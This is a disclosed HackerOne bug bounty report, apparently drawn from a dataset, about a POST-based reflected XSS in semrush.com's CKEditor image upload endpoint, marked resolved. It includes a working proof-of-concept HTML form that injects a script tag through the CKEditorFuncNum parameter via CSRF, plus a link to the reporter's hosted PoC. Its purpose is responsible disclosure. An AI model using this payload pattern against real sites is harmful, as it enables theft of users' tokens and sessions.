---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '375352'
original_report_id: '375352'
title: Post Based XSS On Upload Via CK Editor [semrush.com]
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: semrush
created_at: '2018-07-02T13:44:12.140Z'
disclosed_at: '2018-08-17T13:08:41.729Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Post Based XSS On Upload Via CK Editor [semrush.com]

## Metadata

- HackerOne Report ID: 375352
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: semrush
- Disclosed At: 2018-08-17T13:08:41.729Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** 
XSS Via Post Method When Upload via CKEditor

**Description:** 
This XSS is execute by error message when upload some image on 

```
https://www.semrush.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=0&langCode=en
```

## Browsers Verified In:

  * Firefox

## Steps To Reproduce:

- This is POST based XSS, need some csrf to trigger the xss
- Create .html code like : 

```
<html>
  <body>
    <form action="https://www.semrush.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=dadasd</script><script>alert(document.domain)</script>&langCode=en" method="POST">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
- and click the submit request 
- Or go to http://labs.apapedulimu.click/xss-semrush.html 

## Supporting Material/References:
{F314582}

## Impact

XSS Will be execute it when user click that button, and attacker can stole user token, IP & etc.

Regards,
Apapedulimu

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
